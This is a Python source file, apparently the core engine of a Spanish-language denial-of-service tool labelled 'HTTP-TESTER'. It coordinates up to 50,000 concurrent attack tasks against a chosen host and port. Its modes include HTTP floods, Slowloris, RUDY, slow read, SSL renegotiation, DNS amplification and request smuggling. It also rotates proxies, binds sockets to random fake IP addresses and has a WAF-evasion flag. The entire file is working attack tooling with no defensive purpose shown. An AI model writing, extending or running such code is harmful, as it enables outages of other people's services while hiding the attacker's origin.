import asyncio
import random
import time
import socket
import ssl
from typing import List, Optional
from concurrent.futures import ThreadPoolExecutor
import aiohttp
from aiohttp import ClientSession, TCPConnector, ClientTimeout
from aiohttp_socks import ProxyConnector
from colorama import Fore, Style
import sys
import os

from ataques.inundacion_http import InundacionHTTP
from ataques.slowloris import Slowloris
from ataques.ataque_post import AtaquePOST
from ataques.rudy import Rudy
from ataques.ataque_rango import AtaqueRango
from ataques.cabeceras_multiples import CabecerasMultiples
from ataques.http2 import HTTP2
from ataques.websocket import WebSocket
from ataques.renegociacion_ssl import RenegociacionSSL
from ataques.amplificacion_dns import AmplificacionDNS
from ataques.slow_read import SlowRead
from ataques.request_smuggling import RequestSmuggling
from utilidades.cabeceras import AGENTES_USUARIO, generar_cabeceras_aleatorias
from utilidades.registro import configurar_registro
from .pool_conexiones import PoolConexiones
from .generador_paquetes import GeneradorPaquetes
from .gestor_proxies import GestorProxies
from .gestor_recursos import GestorRecursos

class MotorAtaque:
    def __init__(self, host, puerto, hilos, duracion, ssl, modos,
                 archivo_proxies=None, rotar_ip=False, conexiones_por_hilo=10,
                 tasa=0, tamano_payload=4096, timeout=5, randomizar=False,
                 evadir_waf=False, estadisticas=None, auto_ajuste=True):
        self.host = host
        self.puerto = puerto
        self.hilos = min(hilos, 50000)
        self.duracion = duracion
        self.ssl = ssl
        self.modos = modos
        self.rotar_ip = rotar_ip
        self.conexiones_por_hilo = conexiones_por_hilo
        self.tasa = tasa
        self.tamano_payload = tamano_payload
        self.timeout = timeout
        self.randomizar = randomizar
        self.evadir_waf = evadir_waf
        self.auto_ajuste = auto_ajuste
        self.estadisticas = estadisticas
        self.registro = configurar_registro()
        self.ejecutando = True
        self.pool = PoolConexiones(max_size=hilos * conexiones_por_hilo)
        self.generador = GeneradorPaquetes(tamano_payload)
        self.gestor_proxies = GestorProxies(archivo_proxies) if archivo_proxies else None
        self.gestor_recursos = GestorRecursos() if auto_ajuste else None
        self.ataques = self._inicializar_ataques()
        self.semaforo = asyncio.Semaphore(hilos)
        self.tareas = []
        self.loop = asyncio.get_event_loop()
        self._iniciado = False
        
    def _inicializar_ataques(self):
        ataques = {}
        for modo in self.modos:
            if modo == "inundacion_http":
                ataques[modo] = InundacionHTTP(self)
            elif modo == "slowloris":
                ataques[modo] = Slowloris(self)
            elif modo == "ataque_post":
                ataques[modo] = AtaquePOST(self)
            elif modo == "rudy":
                ataques[modo] = Rudy(self)
            elif modo == "ataque_rango":
                ataques[modo] = AtaqueRango(self)
            elif modo == "cabeceras_multiples":
                ataques[modo] = CabecerasMultiples(self)
            elif modo == "http2":
                ataques[modo] = HTTP2(self)
            elif modo == "websocket":
                ataques[modo] = WebSocket(self)
            elif modo == "renegociacion_ssl":
                ataques[modo] = RenegociacionSSL(self)
            elif modo == "amplificacion_dns":
                ataques[modo] = AmplificacionDNS(self)
            elif modo == "slow_read":
                ataques[modo] = SlowRead(self)
            elif modo == "request_smuggling":
                ataques[modo] = RequestSmuggling(self)
        return ataques
    
    async def iniciar(self):
        # Evitar que se ejecute dos veces
        if self._iniciado:
            return
        self._iniciado = True
        
        self.registro.info(f"{Fore.GREEN}⚡ Iniciando ataque con {self.hilos} hilos")
        self.registro.info(f"{Fore.CYAN}📋 Modos activos: {', '.join(self.modos)}")
        
        if self.gestor_proxies:
            self.registro.info(f"{Fore.MAGENTA}🌐 Proxies cargados: {len(self.gestor_proxies.obtener_todos())}")
        
        if self.auto_ajuste:
            self.registro.info(f"{Fore.CYAN}🔄 Auto-ajuste de recursos activado")
        
        for i in range(self.hilos):
            tarea = asyncio.create_task(self._hilo_ataque(i))
            self.tareas.append(tarea)
        
        tarea_estadisticas = asyncio.create_task(self._mostrar_estadisticas())
        self.tareas.append(tarea_estadisticas)
        
        if self.auto_ajuste:
            tarea_ajuste = asyncio.create_task(self._ajuste_recursos())
            self.tareas.append(tarea_ajuste)
        
        await asyncio.sleep(self.duracion)
        self.ejecutando = False
        
        for tarea in self.tareas:
            tarea.cancel()
        
        await asyncio.gather(*self.tareas, return_exceptions=True)
        await self.pool.limpiar()
        
    async def _hilo_ataque(self, id_hilo):
        # Seleccionar modo aleatorio si hay múltiples
        if len(self.modos) > 1:
            modo_actual = random.choice(self.modos)
        else:
            modo_actual = self.modos[0] if self.modos else "inundacion_http"
            
        ataque = self.ataques.get(modo_actual)
        
        if not ataque:
            return
            
        contador = 0
        while self.ejecutando:
            try:
                async with self.semaforo:
                    proxy = None
                    if self.gestor_proxies and random.random() > 0.3:
                        proxy = self.gestor_proxies.obtener_aleatorio()
                    
                    if self.rotar_ip:
                        socket_original = socket.socket
                        socket.socket = self._crear_socket_con_ip_aleatoria
                    
                    await ataque.ejecutar(proxy)
                    
                    if self.rotar_ip:
                        socket.socket = socket_original
                    
                    # Limitar tasa de requests 
                    if self.tasa > 0:
                        await asyncio.sleep(1.0 / self.tasa)
                    
                    if self.randomizar:
                        await asyncio.sleep(random.uniform(0.001, 0.05))
                    
                    if len(self.modos) > 1 and contador % 10 == 0:
                        modo_actual = random.choice(self.modos)
                        ataque = self.ataques.get(modo_actual)
                        
                    contador += 1
                        
            except asyncio.CancelledError:
                break
            except Exception as e:
                if self.estadisticas:
                    self.estadisticas.agregar_error()
                    
    def _crear_socket_con_ip_aleatoria(self, *args, **kwargs):
        sock = socket.socket(*args, **kwargs)
        ip_falsa = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        try:
            sock.bind((ip_falsa, random.randint(1024, 65535)))
        except:
            pass
        return sock
    
    async def _mostrar_estadisticas(self):
        while self.ejecutando:
            await asyncio.sleep(0.5)
            if not self.estadisticas:
                continue
                
            total, exitos, errores, ancho_banda = self.estadisticas.obtener_todo()
            transcurrido = self.estadisticas.transcurrido()
            tasa = total / transcurrido if transcurrido > 0 else 0
            
            # Obtener info de recursos
            recurso_info = ""
            if self.auto_ajuste and self.gestor_recursos:
                estado = self.gestor_recursos.verificar_recursos()
                recurso_info = f"│ {Fore.YELLOW}CPU: {estado['cpu_uso']:.1f}% │ RAM: {estado['memoria_uso']:.1f}%"
            
            print(f"\033[2J\033[1;1H")
            print(f"{Fore.CYAN}╔═══════════════════════════════════════════════════════════════════════╗")
            print(f"{Fore.CYAN}║                     HTTP-TESTER - ESTADISTICAS EN TIEMPO REAL         ║")
            print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════════════════╝")
            print()
            print(f"{Fore.WHITE}┌─────────────────────────────────────────────────────────────────────┐")
            print(f"{Fore.WHITE}│ Objetivo:    {Fore.YELLOW}{self.host}:{self.puerto}")
            print(f"{Fore.WHITE}│ Modo:        {Fore.MAGENTA}{', '.join(self.modos)}")
            print(f"{Fore.WHITE}│ Hilos:       {Fore.CYAN}{self.hilos}")
            print(f"{Fore.WHITE}│ Duración:    {Fore.CYAN}{self.duracion}s")
            if self.gestor_proxies:
                print(f"{Fore.WHITE}│ Proxies:     {Fore.MAGENTA}{len(self.gestor_proxies.obtener_todos())}")
            if self.auto_ajuste and self.gestor_recursos:
                print(recurso_info)
            print(f"{Fore.WHITE}├─────────────────────────────────────────────────────────────────────┤")
            print(f"{Fore.WHITE}│ Total:       {Fore.YELLOW}{total:>10} ({Fore.GREEN}{tasa:>6.1f}/s{Fore.WHITE})")
            print(f"{Fore.WHITE}│ Éxitos:      {Fore.GREEN}{exitos:>10} ({Fore.CYAN}{(exitos/total*100 if total > 0 else 0):.1f}%{Fore.WHITE})")
            print(f"{Fore.WHITE}│ Errores:     {Fore.RED}{errores:>10} ({Fore.CYAN}{(errores/total*100 if total > 0 else 0):.1f}%{Fore.WHITE})")
            print(f"{Fore.WHITE}│ Ancho Banda: {Fore.MAGENTA}{ancho_banda/(1024*1024):>10.2f} MB")
            print(f"{Fore.WHITE}│ Conexiones:  {Fore.CYAN}{self.pool.conexiones_activas():>10}")
            print(f"{Fore.WHITE}│ Transcurrido:{Fore.YELLOW}{transcurrido:>10.1f}s")
            print(f"{Fore.WHITE}└─────────────────────────────────────────────────────────────────────┘")
    
    async def _ajuste_recursos(self):
        while self.ejecutando:
            if self.gestor_recursos:
                await self.gestor_recursos.ajustar_recursos()
            await asyncio.sleep(5)
    
    async def detener(self):
        self.ejecutando = False
        for tarea in self.tareas:
            tarea.cancel()
        await asyncio.gather(*self.tareas, return_exceptions=True)
        await self.pool.limpiar()
        
    async def esperar(self):
        while self.ejecutando:
            await asyncio.sleep(1)

    async def detener_urgente(self):
        self.ejecutando = False
        
        for tarea in self.tareas:
            if not tarea.done():
                tarea.cancel()
        
        # Cerrar todas las conexiones
        await self.pool.limpiar()
        
        if self.gestor_recursos:
            self.gestor_recursos = None